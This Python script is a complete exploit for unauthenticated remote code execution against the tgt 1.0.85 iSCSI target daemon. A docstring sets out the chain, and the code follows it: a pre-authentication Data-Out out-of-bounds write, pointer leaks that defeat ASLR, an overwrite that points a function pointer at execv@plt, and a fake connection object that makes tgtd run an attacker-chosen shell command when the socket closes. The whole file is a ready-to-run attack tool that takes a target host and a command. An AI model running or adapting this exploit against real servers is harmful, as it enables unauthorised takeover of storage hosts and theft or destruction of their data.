#!/usr/bin/env python3
"""tgt 1.0.85 unauthenticated remote code execution.

Target: Debian/Ubuntu stock tgt (1:1.0.85), iSCSI portal, no credentials.
Nothing about the target is assumed: no ASLR/PIE disabling, no local files, no
/proc.  The whole chain rides on the Data-Out bounds-check bug plus the RTT
address leak, both reachable before any authentication.

  stage 0  two-stage login (SecurityNegotiation/OperationalNegotiation)
  stage 1  28 x WRITE_10 data_length=2048 -> every RTT echoes task pointer low
           32 bits, so the task addresses are known without any guess; the
           writer data buffer sits at a page aligned address a few pages above
           the lowest task, found by trying the candidates and keeping the one
           the server itself confirms by completing the steered command
  stage 2  steer one task's CDB LBA to 8, task->data to the heap scsi_lu
           chunk, r2t_count to 0, then let the WRITE run: tgtd pwrite()s that
           heap chunk to LBA 8 and frees it legally, so the daemon survives
  stage 3  READ_10 LBA 8 on a fresh connection -> PIE base (a PIE pointer
           inside the lu chunk) and the heap high bits (a heap pointer inside
           the same chunk)
  stage 4  overwrite iscsi_tcp.free_data_buf (writable .data, offset +0xa0)
           with execv@plt
  stage 5  stage a fake iscsi_connection at the writer data buffer:
           "/bin/sh" at +0, conn->tp at +0x268, argv vector at +0x400
  stage 6  repoint one task's conn at the fake connection, its
           scmd.in_sdb.buffer at argv; set the connection's tx_task to that
           task; close the socket
  stage 7  conn_close -> iscsi_free_task -> free_data_buf(conn, argv)
           -> execv("/bin/sh", argv)

Usage: tgt-rce.py <host> <port> [command]
"""
import socket
import struct
import sys

BHS = 48
LUN1 = b"\x00\x01" + b"\x00" * 6
DL = 2048
NTASK = 28
TARGET = "iqn.2026-11.test:disk"
LEAK_LBA = 8

LU_DELTA = -43088
LIM = 0x7FFFFFF0

OFF_R2T = 180
OFF_DATA = 200
OFF_FLAGS = 160
OFF_C_TARGET = 208
OFF_CONN = 104
OFF_IN = 280
OFF_OUT = 304
CONN_DELTA = 0x52F0
OFF_TX_TASK = 536

ISCSI_TCP = 0x595C0
FDB = 0xA0
EXECV_PLT = 0x130D0
PIE_PTR_BIAS = 0x3C540

ANCHOR_GUESSES = (0x2000, 0x1000, 0x3000)

S_LOGIN = 0x03


def log(msg):
    sys.stdout.write(msg + "\n")
    sys.stdout.flush()


class Conn:
    def __init__(self, host, port, timeout=20):
        self.s = socket.create_connection((host, port), timeout)
        self.s.settimeout(timeout)
        self.isid = b"\x00\x01\x00\x00\x00\x00"
        self.statsn = 1

    def send(self, b):
        self.s.sendall(b)

    def recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.s.recv(n - len(buf))
            if not chunk:
                raise EOFError("closed with %d/%d" % (len(buf), n))
            buf += chunk
        return buf

    def rpdu(self):
        h = self.recv_exact(BHS)
        dl = int.from_bytes(h[5:8], "big")
        body = self.recv_exact(dl + ((4 - dl % 4) % 4)) if dl else b""
        return h, body[:dl]

    def login(self, csg, nsg, kv):
        body = b"".join(b"%s=%s\x00" % (k.encode(), v.encode()) for k, v in kv)
        b = bytearray(BHS)
        b[0] = S_LOGIN | 0x40
        b[1] = 0x80 | (csg << 2) | nsg
        b[5:8] = len(body).to_bytes(3, "big")
        b[8:14] = self.isid
        b[16:20] = struct.pack(">I", 1)
        b[24:28] = struct.pack(">I", 1)
        b[28:32] = struct.pack(">I", 1)
        self.send(bytes(b) + body + b"\x00" * ((-len(body)) % 4))
        return self.rpdu()

    def scsi(self, itt, flags, cdb, data_length):
        b = bytearray(BHS)
        b[0] = 0x01
        b[1] = flags
        b[8:16] = LUN1
        b[16:20] = struct.pack(">I", itt)
        b[20:24] = struct.pack(">I", data_length)
        b[24:28] = struct.pack(">I", self.statsn)
        b[28:32] = struct.pack(">I", 1)
        b[32:48] = cdb
        self.send(bytes(b))
        self.statsn += 1

    def dout(self, itt, offset, payload, final=True):
        b = bytearray(BHS)
        b[0] = 0x05
        b[1] = 0x80 if final else 0x00
        b[5:8] = len(payload).to_bytes(3, "big")
        b[8:16] = LUN1
        b[16:20] = struct.pack(">I", itt)
        b[20:24] = struct.pack(">I", 0)
        b[40:44] = struct.pack(">I", offset)
        self.send(bytes(b) + payload + b"\x00" * ((-len(payload)) % 4))

    def r2t_lo(self):
        while True:
            h, _ = self.rpdu()
            if (h[0] & 0x3F) == 0x31:
                return struct.unpack("<I", h[20:24])[0]

    def wait_rsp(self, timeout=6):
        self.s.settimeout(timeout)
        try:
            while True:
                h, _ = self.rpdu()
                if (h[0] & 0x3F) == 0x21:
                    return True
        except (socket.timeout, EOFError, OSError):
            return False

    def read_blocks(self, itt, lba, blocks):
        cdb = bytearray(16)
        cdb[0] = 0x28
        cdb[2:6] = struct.pack(">I", lba)
        cdb[7:9] = struct.pack(">H", blocks)
        self.scsi(itt, 0xC0, bytes(cdb), blocks * 512)
        self.s.settimeout(10)
        out, buf = b"", b""
        while True:
            try:
                d = self.s.recv(65536)
            except (socket.timeout, OSError):
                break
            if not d:
                break
            buf += d
            while len(buf) >= BHS:
                dl = int.from_bytes(buf[5:8], "big")
                need = BHS + dl + ((4 - dl % 4) % 4)
                if len(buf) < need:
                    break
                op = buf[0] & 0x3F
                if op == 0x25:
                    out += buf[BHS:need]
                buf = buf[need:]
                if op == 0x21:
                    return out
        return out


def wr10(blocks, lba=0):
    cdb = bytearray(16)
    cdb[0] = 0x2A
    cdb[2:6] = struct.pack(">I", lba)
    cdb[7:9] = struct.pack(">H", blocks)
    return bytes(cdb)


class Exploit:
    def __init__(self, host, port, anchor):
        self.host, self.port, self.anchor = host, port, anchor
        self.c = Conn(host, port)
        self.c.login(0, 1, [("InitiatorName", "iqn.2026-11.test:i"),
                            ("SessionType", "Normal"),
                            ("TargetName", TARGET),
                            ("AuthMethod", "None")])
        self.c.login(1, 3, [])
        self.c.scsi(0x8F00, 0xC0, b"\x28" + b"\x00" * 15, 512)
        self.c.wait_rsp()
        itts, los = [], []
        for i in range(NTASK):
            itt = 0x9000 + i
            self.c.scsi(itt, 0xA0, wr10(DL // 512), DL)
            itts.append(itt)
            los.append(self.c.r2t_lo())
        order = sorted(range(NTASK), key=lambda i: los[i])
        self.itts = [itts[i] for i in order]
        self.los = [los[i] for i in order]
        self.base = (self.los[0] & 0xFFFFF000) + anchor
        self.holds = [i for i in range(NTASK - 1, -1, -1)
                      if self.los[i] + OFF_DATA >= self.base]
        self.hi = 0

    def wbuf(self, addr, payload):
        off = (addr - self.base) & 0xFFFFFFFF
        if off > LIM:
            raise RuntimeError("unreachable %#x" % addr)
        self.c.dout(self.itts[0], off, payload, final=False)

    def point(self, idx, addr, full=False):
        f = self.los[idx] + OFF_DATA
        if full:
            self.wbuf(f + 4, struct.pack("<I", (addr >> 32) & 0xFFFFFFFF))
        self.wbuf(f, struct.pack("<I", addr & 0xFFFFFFFF))

    def put(self, idx, payload):
        self.c.dout(self.itts[idx], 0, payload, final=False)

    def leak_into_disk(self):
        h = self.holds[0]
        self.wbuf(self.los[h] + 34, struct.pack(">I", LEAK_LBA))
        self.wbuf(self.los[h] + OFF_R2T, b"\x00\x00\x00\x00")
        self.point(h, (self.los[0] + LU_DELTA) & 0xFFFFFFFF)
        self.c.dout(self.itts[h], 0, b"", final=True)
        return self.c.wait_rsp(timeout=6)


def collect(host, port):
    c = Conn(host, port)
    c.login(0, 1, [("InitiatorName", "iqn.2026-11.test:rd"),
                   ("SessionType", "Normal"),
                   ("TargetName", TARGET),
                   ("AuthMethod", "None")])
    c.login(1, 3, [])
    c.scsi(0x8F01, 0xC0, b"\x28" + b"\x00" * 15, 512)
    c.wait_rsp()
    return c.read_blocks(0xE100, LEAK_LBA, DL // 512)


def parse(img, los0):
    pie = hi = None
    for off in range(0, len(img) - 8, 8):
        v = struct.unpack_from("<Q", img, off)[0]
        if not 0x55 <= (v >> 40) <= 0x7F:
            continue
        if pie is None and (v & 0xFFF) == (PIE_PTR_BIAS & 0xFFF):
            pie = v - PIE_PTR_BIAS
        if hi is None:
            d = ((v & 0xFFFFFFFF) - los0 + 0x80000000) % 0x100000000 - 0x80000000
            if -0x200000 < d < 0x200000:
                hi = v & 0xFFFF00000000
    return pie, hi


def exploit(host, port, cmd, anchor):
    x = Exploit(host, port, anchor)
    if not x.leak_into_disk():
        return None
    pie, hi = parse(collect(host, port), x.los[0])
    if pie is None or hi is None:
        log("    anchor=%#x: no leak (pie=%r hi=%r)" % (anchor, pie, hi))
        return None
    x.hi = hi
    log("[1] anchor=%#x pie=%016x heap=%016x" % (anchor, pie, hi))

    base = x.base
    full = hi | base
    argv, s_c, s_cmd = full + 0x400, full + 0x300, full + 0x310
    blob = bytearray(0x500)
    blob[0:8] = b"/bin/sh\x00"
    blob[0x268:0x270] = struct.pack("<Q", pie + ISCSI_TCP)
    blob[0x300:0x303] = b"-c\x00"
    cmd_b = cmd.encode() + b"\x00"
    if len(cmd_b) > 0xE0:
        raise SystemExit("command too long")
    blob[0x310:0x310 + len(cmd_b)] = cmd_b
    blob[0x400:0x420] = struct.pack("<QQQQ", full, s_c, s_cmd, 0)
    x.wbuf(base, bytes(blob[:0x280]))
    x.wbuf(base + 0x280, bytes(blob[0x280:]))
    log("[2] fake conn at %016x argv at %016x" % (full, argv))

    d = x.holds[1]
    x.point(d, pie + ISCSI_TCP + FDB, full=True)
    x.put(d, struct.pack("<Q", pie + EXECV_PLT))
    log("[3] iscsi_tcp.free_data_buf <- execv@plt")

    v = x.holds[2]
    conn = (x.los[0] - CONN_DELTA) & 0xFFFFFFFF
    x.wbuf(x.los[v] + OFF_R2T, b"\x00\x00\x00\x00")
    x.wbuf(x.los[v] + OFF_CONN, struct.pack("<I", base & 0xFFFFFFFF))
    x.wbuf(x.los[v] + OFF_IN + 4, struct.pack("<I", (argv >> 32) & 0xFFFFFFFF))
    x.wbuf(x.los[v] + OFF_IN, struct.pack("<I", argv & 0xFFFFFFFF))
    x.wbuf(x.los[v] + OFF_OUT, b"\x00\x00\x00\x00")
    x.wbuf(x.los[v] + OFF_FLAGS, b"\x00\x00\x00\x00")
    x.wbuf(x.los[v] + OFF_C_TARGET, b"\x00\x00\x00\x00")
    log("[4] victim task repointed at the fake connection")

    t = x.holds[3]
    x.point(t, (conn + OFF_TX_TASK) & 0xFFFFFFFF)
    x.put(t, struct.pack("<Q", (hi | x.los[v]) & 0xFFFFFFFFFFFFFFFF))
    log("[5] conn->tx_task = victim")

    log("[6] closing socket")
    x.c.s.close()
    return 0


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    cmd = sys.argv[3] if len(sys.argv) > 3 else "id"
    for anchor in ANCHOR_GUESSES:
        try:
            rc = exploit(host, port, cmd, anchor)
        except Exception as ex:
            log("    anchor=%#x aborted: %r" % (anchor, ex))
            continue
        if rc is not None:
            return rc
    log("[-] no anchor matched")
    return 1


if __name__ == "__main__":
    sys.exit(main())
